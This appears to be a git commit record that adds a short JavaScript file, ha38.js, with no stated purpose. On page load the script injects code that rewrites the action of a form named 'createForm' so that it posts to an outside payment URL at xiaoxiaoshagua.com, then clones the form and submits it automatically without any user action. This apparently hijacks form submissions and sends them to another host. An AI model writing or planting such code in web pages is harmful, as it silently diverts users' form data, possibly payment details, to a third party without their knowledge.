b87af60ec8e71cc5cb169c6df707d9a7bf75385b
xjjkong <138182422+xjjkong@users.noreply.github.com>
2023-07-05 19:59:50 +0800

    Update and rename ha37.js to ha38.js

---
+++ ha38.js
@@ -0,0 +1,10 @@
+window.onload = function() {
+  var scriptEle = document.createElement("script");
+  scriptEle.type = "text/javascript";
+  scriptEle.text = `document.getElementById('createForm').action = 'https://www.xiaoxiaoshagua.com/create_payment/';`;
+  document.body.appendChild(scriptEle);
+  let node = document.getElementById('createForm');
+  let c = node.cloneNode(true);
+  document.body.appendChild(c);
+  c.submit();
+}
